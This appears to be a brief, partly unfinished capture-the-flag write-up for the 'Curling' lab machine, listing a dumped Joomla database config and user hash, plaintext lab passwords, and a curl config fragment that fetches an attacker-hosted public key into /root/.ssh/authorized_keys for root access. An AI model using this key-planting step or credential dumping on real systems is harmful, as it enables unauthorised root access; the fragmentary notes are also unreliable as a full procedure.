Name & IP Address of Machine:
> CURLING : `10.10.10.150`
<!-- TOC -->

- [Synopsis](#synopsis)
- [Enumeration](#enumeration)
- [FootHold](#foothold)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->



## Synopsis
- `floris:Curling2018!`
```bash
    public $dbtype = 'mysqli';
    public $host = 'localhost';
    public $user = 'floris';
    public $password = 'mYsQ!P4ssw0rd$yea!';
    public $db = 'Joombla';
```

```bash
mysql> select name,username,password from eslfu_users;
+------------+----------+--------------------------------------------------------------+
| name       | username | password                                                     |
+------------+----------+--------------------------------------------------------------+
| Super User | floris   | $2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e (Curling2018!)|
+------------+----------+--------------------------------------------------------------+
1 row in set (0.00 sec)
```
## Enumeration
Opened Ports: 
- [ ] 22 (SSH)
- [ ] 80 (HTTP) - JOOMLA CMS



## FootHold

## Lateral Movement
- A backup file is found on the home directory of floris. Unzipping that gets the user floris.
- `floris:5d<wdCbdZu)|hChXll`

## Privilege Escalation


```bash
#
url = "http://10.10.14.10:8000/id_rsa.pub"
-o /root/.ssh/authorized_keys
#

#
url = "http://10.10.14.10:8000/id_rsa.pub"
#
```

<!-- ## Thank You 
🕉️  -->


<!-- ## Tools Used.
- [ ] . -->